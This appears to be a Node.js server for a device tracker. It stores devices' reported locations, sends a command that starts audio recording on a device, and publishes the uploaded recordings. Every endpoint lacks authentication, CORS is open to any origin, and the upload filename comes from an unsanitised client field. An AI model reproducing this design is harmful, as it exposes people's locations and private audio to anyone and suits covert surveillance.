import express from 'express';
import http from 'http';
import { Server } from 'socket.io';
import bodyParser from 'body-parser';
import fs from 'fs';
import path from 'path';
import multer from 'multer';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

const PORT = process.env.PORT || 3000;
const DATA_FILE = './devices.json';
const AUDIO_DIR = './uploads/audio';

if (!fs.existsSync(AUDIO_DIR)) fs.mkdirSync(AUDIO_DIR, { recursive: true });

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, AUDIO_DIR),
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        cb(null, `audio_${deviceId}_${Date.now()}.mp3`);
    }
});
const upload = multer({ storage: storage });

app.use(bodyParser.json());
app.use('/uploads', express.static('uploads'));

let devices = {};
if (fs.existsSync(DATA_FILE)) {
    try { devices = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { devices = {}; }
}

app.post('/location/update', (req, res) => {
    const data = req.body;
    if (!data.deviceId) return res.sendStatus(400);
    const id = data.deviceId.toLowerCase();
    devices[id] = { ...devices[id], ...data, timestamp: Date.now(), status: 'online' };
    fs.writeFileSync(DATA_FILE, JSON.stringify(devices, null, 2));
    io.emit('location_update', devices[id]);
    res.sendStatus(200);
});

app.get('/devices', (req, res) => res.json(Object.values(devices)));

app.post('/devices/:id/audio-request', (req, res) => {
    io.emit('command', { deviceId: req.params.id.toLowerCase(), action: 'START_RECORDING' });
    res.json({ message: "Sent" });
});

app.post('/audio/upload', upload.single('audio'), (req, res) => {
    io.emit('new_audio', {
        deviceId: req.body.deviceId,
        url: `/uploads/audio/${req.file.filename}`
    });
    res.sendStatus(200);
});

server.listen(PORT, () => console.log(`🚀 Server online auf Port ${PORT}`));
